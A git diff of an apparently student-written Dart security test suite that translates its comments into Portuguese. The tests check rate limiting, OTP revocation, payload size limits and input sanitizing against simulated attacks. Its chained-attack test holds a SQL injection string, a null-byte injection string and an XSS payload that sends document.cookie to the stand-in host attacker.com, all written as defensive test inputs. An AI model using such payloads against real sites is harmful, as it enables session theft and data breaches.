@@ -1,7 +1,7 @@
 // Desenvolvido por Alex Gabriel Soares Sousa - RA: 24802449
 
-/// Tier 4: Real-World Adversarial Attack Workloads & Security Governance Test Suite
-/// Simulates end-to-end attacks and validates repository governance.
+/// Camada 4: Suíte de Testes de Cargas de Ataque Adversariais do Mundo Real e Governança de Segurança
+/// Simula ataques ponta a ponta e valida a governança do repositório.
 
 import 'dart:io';
 import 'rate_limiter_test.dart';
@@ -54,7 +54,7 @@ void main() {
   print('===============================================================');
 
   // -------------------------------------------------------------
-  // WORKLOAD 1: Automated Credential Stuffing & Dictionary Attack Bot
+  // CARGA 1: Bot Automatizado de Credential Stuffing e Ataque de Dicionário
   // -------------------------------------------------------------
   runTest('W1: Dictionary attack bot attempting 100 rapid logins is blocked by lockout after attempt 5', () {
     final rateLimiter = RateLimiter();
@@ -67,7 +67,7 @@ void main() {
     for (final _ in dictionary) {
       if (rateLimiter.checkAllowed(targetAccount)) {
         allowedEvaluations++;
-        // Password fails
+        // Falha na senha
         rateLimiter.recordFailure(targetAccount);
       } else {
         blockedAttempts++;
@@ -80,7 +80,7 @@ void main() {
   });
 
   // -------------------------------------------------------------
-  // WORKLOAD 2: Academic Identity Harvesting Crawler
+  // CARGA 2: Rastreador de Coleta de Identidades Acadêmicas
   // -------------------------------------------------------------
   runTest('W2: Identity harvesting crawler across 50 valid and 50 invalid RAs receives identical feedback', () {
     final authService = MockAuthService();
@@ -103,7 +103,7 @@ void main() {
   });
 
   // -------------------------------------------------------------
-  // WORKLOAD 3: Ephemeral Recovery Token Brute-Force & Replay Attack
+  // CARGA 3: Força Bruta em Token Efêmero de Recuperação e Ataque de Replay
   // -------------------------------------------------------------
   runTest('W3: High-frequency OTP brute-force bot guessing 6-digit codes triggers revocation at attempt 3', () {
     final tokenManager = TokenLifecycleManager();
@@ -113,7 +113,7 @@ void main() {
     int attemptsMade = 0;
     bool sessionKilled = false;
 
-    // Bot guesses codes: 000000, 000001, 000002...
+    // O bot tenta os códigos: 000000, 000001, 000002...
     for (int i = 0; i < 50; i++) {
       final guess = i.toString().padLeft(6, '0');
       final result = tokenManager.verifyCode('sess_admin', guess, now: t0);
@@ -127,14 +127,14 @@ void main() {
     assertEqual(attemptsMade, 3, 'Kill switch must trigger exactly at attempt 3');
     assertTrue(sessionKilled, 'Session must be permanently revoked');
 
-    // Bot now guesses the EXACT correct code on attempt 4
+    // O bot agora tenta o código EXATO correto na tentativa 4
     final correctResult = tokenManager.verifyCode('sess_admin', '849201', now: t0);
     assertFalse(correctResult.isSuccess, 'Correct code on killed session must fail');
     assertEqual(correctResult.status, 'REVOKED', 'Must confirm session is dead');
   });
 
   // -------------------------------------------------------------
-  // WORKLOAD 4: Slowloris & Memory Amplification Payload DoS Simulation
+  // CARGA 4: Simulação de DoS por Slowloris e Amplificação de Memória por Payload
   // -------------------------------------------------------------
   runTest('W4: 64 KB payload boundary is strictly enforced against memory amplification', () {
     final maxPayloadBytes = 65536; // 64 KB
@@ -147,31 +147,31 @@ void main() {
       'Oversized payload exceeds 64 KB ceiling',
     );
 
-    // Simulated bounded reader check
+    // Verificação simulada de leitor limitado
     bool isWithinCeiling(int byteLength) => byteLength <= maxPayloadBytes;
     assertTrue(isWithinCeiling(validPayload.length), '65,536 bytes must be allowed');
     assertFalse(isWithinCeiling(oversizedPayload.length), '65,537 bytes must be rejected');
   });
 
   // -------------------------------------------------------------
-  // WORKLOAD 5: Multi-Vector Compromise Attempt (Chained Exploit)
+  // CARGA 5: Tentativa de Comprometimento Multivetor (Exploit Encadeado)
   // -------------------------------------------------------------
   runTest('W5: Chained multi-vector attack is intercepted at every defensive perimeter', () {
-    // Vector A: Null byte poisoning in RA identifier
+    // Vetor A: Envenenamento por byte nulo no identificador de RA
     final poisonedRA = '24802449\x00admin';
     assertTrue(InputSanitizer.hasDangerousPatterns(poisonedRA), 'Null byte in RA intercepted');
     final cleanedRA = InputSanitizer.sanitizeString(poisonedRA);
     assertFalse(cleanedRA.contains('\x00'), 'Null byte neutralized');
 
-    // Vector B: SQL injection in password field
+    // Vetor B: Injeção SQL no campo de senha
     final sqliPassword = "' OR '1'='1; --";
     assertTrue(InputSanitizer.hasDangerousPatterns(sqliPassword), 'SQLi meta-chars intercepted');
 
-    // Vector C: Stored XSS payload in email field
+    // Vetor C: Payload de XSS armazenado no campo de e-mail
     final xssEmail = "<script>fetch('http://attacker.com?c=' + document.cookie)</script>";
     assertTrue(InputSanitizer.hasDangerousPatterns(xssEmail), 'XSS payload intercepted');
 
-    // Vector D: Password reset with trivial entropy
+    // Vetor D: Redefinição de senha com entropia trivial
     final trivialPassword = 'admin';
     assertFalse(
       PasswordEntropyValidator.isEligibleForSubmission(trivialPassword),
@@ -180,7 +180,7 @@ void main() {
   });
 
   // -------------------------------------------------------------
-  // GOVERNANCE AUDIT: Attribution & Directory Isolation Check
+  // AUDITORIA DE GOVERNANÇA: Verificação de Atribuição e Isolamento de Diretórios
   // -------------------------------------------------------------
   runTest('GOV-01: Line 1 author attribution verified across all test files', () {
     var testsDir = Directory('test');
